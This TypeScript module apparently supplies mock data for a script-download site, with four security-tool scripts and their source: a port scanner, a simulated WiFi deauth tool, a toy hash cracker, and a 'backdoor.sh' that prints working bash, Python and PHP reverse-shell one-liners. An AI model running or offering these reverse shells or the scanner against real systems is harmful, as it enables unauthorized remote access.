
export interface Script {
  id: string;
  name: string;
  description: string;
  language: 'python' | 'bash' | 'javascript' | 'ruby';
  category: 'exploit' | 'reconnaissance' | 'utility' | 'cryptography';
  fileSize: string;
  dateAdded: string;
  downloadCount: number;
  sourceCode: string;
}

// Mock scripts data
export const scripts: Script[] = [
  {
    id: 'script-001',
    name: 'port_scanner.py',
    description: 'Advanced port scanner with service detection',
    language: 'python',
    category: 'reconnaissance',
    fileSize: '12.5 KB',
    dateAdded: '2023-10-15',
    downloadCount: 1247,
    sourceCode: `#!/usr/bin/python3
import socket
import sys
from datetime import datetime

# Define target
target = input("Enter the target IP address: ")
start_port = int(input("Enter starting port: "))
end_port = int(input("Enter ending port: "))

# Add a pretty banner
print("-" * 50)
print("Scanning target: " + target)
print("Time started: " + str(datetime.now()))
print("-" * 50)

# Scan ports
try:
    for port in range(start_port, end_port + 1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((target, port))
        if result == 0:
            print(f"Port {port}: Open")
        s.close()

except KeyboardInterrupt:
    print("\\nExiting program.")
    sys.exit()
except socket.gaierror:
    print("Hostname could not be resolved.")
    sys.exit()
except socket.error:
    print("Could not connect to server.")
    sys.exit()

print("Scan completed at: " + str(datetime.now()))`,
  },
  {
    id: 'script-002',
    name: 'wifi_deauth.py',
    description: 'WiFi deauthentication attack script',
    language: 'python',
    category: 'exploit',
    fileSize: '8.3 KB',
    dateAdded: '2023-11-05',
    downloadCount: 857,
    sourceCode: `#!/usr/bin/python3
# This is a conceptual script - requires actual wireless libraries and root access to function
# Do not use for malicious purposes

import time
print("WiFi Deauthentication Tool")
print("This is a conceptual script for educational purposes only")
print("In a real implementation, this would use libraries like Scapy")
print("Usage would require root privileges and proper wireless interfaces")

# Conceptual code representing what such a script might look like
interface = input("Enter wireless interface (e.g., wlan0): ")
target_bssid = input("Enter target BSSID: ")
target_client = input("Enter client MAC (or 'FF:FF:FF:FF:FF:FF' for all): ")
packets = int(input("Number of deauth packets to send: "))

print(f"\\nStarting deauthentication attack...")
print(f"Interface: {interface}")
print(f"Target AP: {target_bssid}")
print(f"Target Client: {target_client}")
print(f"Packets to send: {packets}")

# Simulate packets being sent
for i in range(packets):
    print(f"Sending deauth packet {i+1}/{packets}")
    time.sleep(0.5)

print("\\nAttack completed. Remember: Only use on networks you own or have permission to test.")`,
  },
  {
    id: 'script-003',
    name: 'hash_cracker.js',
    description: 'Simple MD5 and SHA1 hash cracker',
    language: 'javascript',
    category: 'cryptography',
    fileSize: '4.7 KB',
    dateAdded: '2023-09-22',
    downloadCount: 635,
    sourceCode: `// Hash Cracker - A simple demonstration of brute-forcing hashes
// For educational purposes only
// Would require a Node.js environment with crypto library

const crypto = require('crypto');

// Function to generate MD5 hash
function md5(text) {
  return crypto.createHash('md5').update(text).digest('hex');
}

// Function to generate SHA1 hash
function sha1(text) {
  return crypto.createHash('sha1').update(text).digest('hex');
}

// Simple brute force function (extremely limited)
function crackHash(hash, hashFunction, charset, maxLength) {
  console.log(\`Attempting to crack hash: \${hash}\`);
  console.log(\`Character set: \${charset}\`);
  console.log(\`Max length: \${maxLength}\`);
  
  // This is a very simplified example that only tries 
  // combinations up to length 3 from the charset
  for (let length = 1; length <= maxLength; length++) {
    console.log(\`Trying combinations of length \${length}...\`);
    
    // This is a simplified implementation and would need recursion
    // for a proper implementation of all possible combinations
    for (let i = 0; i < charset.length; i++) {
      const attempt = charset[i];
      const attemptHash = hashFunction(attempt);
      
      if (attemptHash === hash) {
        return attempt;
      }
    }
  }
  
  return null;
}

// Example usage
const targetHash = "5f4dcc3b5aa765d61d8327deb882cf99"; // 'password' in MD5
const result = crackHash(targetHash, md5, "abcdefghijklmnopqrstuvwxyz", 3);

if (result) {
  console.log(\`Hash cracked! The original text was: \${result}\`);
} else {
  console.log("Failed to crack the hash with the given parameters.");
}`,
  },
  {
    id: 'script-004',
    name: 'backdoor.sh',
    description: 'Simple reverse shell script',
    language: 'bash',
    category: 'exploit',
    fileSize: '2.1 KB',
    dateAdded: '2023-12-01',
    downloadCount: 422,
    sourceCode: `#!/bin/bash
# This is a conceptual reverse shell script for educational purposes only
# Do not use for malicious purposes

echo "Reverse Shell Generator - FOR EDUCATIONAL PURPOSES ONLY"
echo "This script demonstrates concepts only and has safety limiters"
echo "In a controlled environment, this would create a connection back to a listener"

# Get parameters
read -p "Enter listener IP: " ip_address
read -p "Enter listener port: " port

# Validate IP and port (simple validation)
if [[ ! $ip_address =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  echo "Invalid IP address format"
  exit 1
fi

if [[ ! $port =~ ^[0-9]+$ ]] || [ $port -lt 1 ] || [ $port -gt 65535 ]; then
  echo "Invalid port number"
  exit 1
fi

echo "\\nGenerating reverse shell command for $ip_address:$port"
echo "\\nBash reverse shell:"
echo "bash -i >& /dev/tcp/$ip_address/$port 0>&1"

echo "\\nPython reverse shell:"
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip_address\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"

echo "\\nPHP reverse shell:"
echo "php -r '\$sock=fsockopen(\"$ip_address\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

echo "\\nRemember: Only use on systems you own or have permission to test."
echo "This script does not actually execute any reverse shells - it only generates commands."`,
  },
];

export const getScripts = (): Promise<Script[]> => {
  // Simulate API delay
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve(scripts);
    }, 800);
  });
};

export const getScriptById = (id: string): Promise<Script | undefined> => {
  return new Promise((resolve) => {
    setTimeout(() => {
      const script = scripts.find(s => s.id === id);
      resolve(script);
    }, 300);
  });
};

export const downloadScript = (script: Script): void => {
  // Create blob with the source code
  const blob = new Blob([script.sourceCode], { type: 'text/plain' });
  
  // Create download link
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = script.name;
  
  // Trigger download
  document.body.appendChild(a);
  a.click();
  
  // Clean up
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
};
